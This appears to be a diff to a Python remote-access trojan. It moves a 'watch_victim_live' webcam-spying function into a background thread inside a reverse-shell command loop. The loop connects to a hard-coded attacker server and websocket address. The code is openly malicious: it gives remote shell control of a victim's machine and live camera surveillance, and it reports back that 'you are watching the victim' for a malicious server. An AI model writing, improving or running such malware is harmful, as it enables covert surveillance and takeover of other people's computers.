@@ -11,6 +11,7 @@ import gps
 import io
 import shlex
 from PIL import ImageGrab
+import threading
 SERVER_URL = "192.168.88.105:2020"
 WEBSOCKET_URL="ws://192.168.88.105:8765"
 PORT=12345
@@ -188,7 +189,7 @@ def reverse_shell_payload():
                     s.send(f"[-] {e}\n".encode())
                 continue
            if cmd.lower() == "start-camera-live":
-               watch_victim_live()
+               threading.Thread(target=watch_victim_live,daemon=True).start()
                s.send(b"You are watching the victim for your mailicous server\n")
            if cmd.lower() == "exit":
                break
